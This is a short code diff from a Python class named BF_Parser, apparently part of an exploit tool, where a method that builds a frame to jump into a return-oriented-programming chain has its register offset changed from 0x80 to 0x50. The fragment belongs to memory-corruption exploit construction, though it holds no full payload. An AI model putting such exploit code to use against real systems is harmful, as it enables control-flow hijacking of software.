@@ -188,7 +188,7 @@ class BF_Parser():
 
     def jump_to_rop(self, rop_chain_start):
         return self.__charger.construct_frame(ra=self.__move_sp.get_vaddr(), \
-                                              s0=rop_chain_start + 0x80 \
+                                              s0=rop_chain_start + 0x50 \
                                               )
 
     def parse(self, pointer_start, sp):
